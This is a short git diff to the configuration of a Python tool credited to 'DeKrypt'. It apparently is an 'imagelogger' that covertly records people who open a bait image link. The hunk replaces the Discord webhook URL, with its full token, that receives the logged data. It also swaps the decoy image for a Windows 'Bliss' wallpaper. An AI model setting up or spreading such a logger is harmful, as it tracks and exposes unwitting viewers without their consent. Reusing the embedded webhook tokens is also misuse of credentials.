@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1334849073890721883/1WpYw7dnCk5dmm8bFU5lrP_k_2sObR_hm3Fcy6qVZqgcIAxTdcpcmoQTKvDwAfS-NFvD",
-    "image": "https://www.pixelstalk.net/wp-content/uploads/2016/10/Bliss-Wallpaper-Full-HD.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334857061871390922/1Zfe2x9JAMwOI4BeUi_AgrkTClTG1x4dXp7vdFZe1NLll-qdsThsD2mfuqTNU8R-EfKt",
+    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
